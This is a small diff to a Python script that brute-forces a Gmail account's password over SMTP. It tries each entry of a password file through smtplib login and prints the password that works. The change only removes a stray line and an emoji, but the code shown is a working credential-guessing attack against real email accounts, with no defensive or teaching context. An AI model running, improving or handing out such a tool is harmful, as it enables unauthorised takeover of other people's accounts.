@@ -1,4 +1,3 @@
-clear
 import smtplib
 smtpserver = smtplib.SMTP("smtp.gmail.com:587")
 smtpserver.ehlo()
@@ -21,7 +20,7 @@ def ano ():
         for password in password_file:
            try:
                smtpserver.login(email,password)
-               print("Password Found✅  :  ",password)
+               print("Password Found  :  ",password)
                break
            except smtplib.SMTPAuthenticationError :
                 print("Passwor injections  :  ",password)
